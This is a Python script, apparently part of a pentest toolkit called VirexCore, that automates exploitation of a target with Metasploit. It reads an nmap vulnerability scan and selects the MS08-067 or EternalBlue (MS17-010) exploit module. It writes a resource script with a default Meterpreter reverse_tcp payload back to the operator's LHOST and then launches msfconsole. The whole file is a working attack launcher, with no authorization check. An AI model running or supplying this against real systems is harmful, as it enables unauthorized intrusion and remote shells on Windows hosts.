#!/usr/bin/env python3
import os
import sys
import subprocess

# Colors
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
BOLD = "\033[1m"
RESET = "\033[0m"

def create_target_directory(target):
    """Create the target directory in /tmp/VirexCore/"""
    target_dir = f"/tmp/VirexCore/{target}"
    os.makedirs(target_dir, exist_ok=True)
    
    # Create metasploit subdirectory
    metasploit_dir = os.path.join(target_dir, "metasploit")
    os.makedirs(metasploit_dir, exist_ok=True)
    
    return target_dir, metasploit_dir

def generate_rc_file(target, metasploit_dir, rhost, lhost, lport, exploit_module, payload):
    """Generate Metasploit resource script file"""
    rc_file = os.path.join(metasploit_dir, "auto_exploit.rc")
    
    with open(rc_file, 'w') as f:
        f.write(f"use {exploit_module}\n")
        f.write(f"set RHOSTS {rhost}\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write(f"set PAYLOAD {payload}\n")
        f.write("exploit\n")
        f.write("exit\n")
    
    return rc_file

def main():
    """Main function"""
    if len(sys.argv) < 2:
        print(f"{RED}Usage: {sys.argv[0]} <target_ip_or_domain>{RESET}")
        sys.exit(1)
    
    target = sys.argv[1]
    target_dir, metasploit_dir = create_target_directory(target)
    
    print(f"{GREEN}[+] Target: {target}{RESET}")
    print(f"{GREEN}[+] Output directory: {metasploit_dir}{RESET}")
    
    # Get user input
    rhost = input(f"{CYAN}→ Enter RHOST (Target IP) [{target}]: {RESET}") or target
    lhost = input(f"{CYAN}→ Enter LHOST (Your IP) [default: 192.168.1.5]: {RESET}") or "192.168.1.5"
    lport = input(f"{CYAN}→ Enter LPORT (Your Port) [default: 4444]: {RESET}") or "4444"
    
    # Check for default exploit module from nmap scan
    nmap_file = os.path.join(target_dir, "nmap_vuln_scan.txt")
    default_exploit = ""
    
    if os.path.exists(nmap_file):
        with open(nmap_file, 'r') as f:
            content = f.read().lower()
            if "ms08-067" in content:
                default_exploit = "exploit/windows/smb/ms08_067_netapi"
            elif "ms17-010" in content:
                default_exploit = "exploit/windows/smb/ms17_010_eternalblue"
    
    exploit_module = input(f"{CYAN}→ Enter Exploit Module [{default_exploit}]: {RESET}") or default_exploit
    payload = input(f"{CYAN}→ Enter Payload [default: windows/meterpreter/reverse_tcp]: {RESET}") or "windows/meterpreter/reverse_tcp"
    
    # Generate and save RC file
    rc_file = generate_rc_file(target, metasploit_dir, rhost, lhost, lport, exploit_module, payload)
    print(f"{GREEN}[✓] Exploit script saved to {rc_file}{RESET}")
    
    # Run Metasploit
    print(f"{YELLOW}[~] Launching Metasploit...{RESET}")
    try:
        subprocess.run(["msfconsole", "-r", rc_file], check=True)
        print(f"{GREEN}[✓] Metasploit session completed{RESET}")
    except subprocess.CalledProcessError:
        print(f"{RED}[!] Error running Metasploit{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] Metasploit not found. Please install Metasploit.{RESET}")

if __name__ == "__main__":
    main()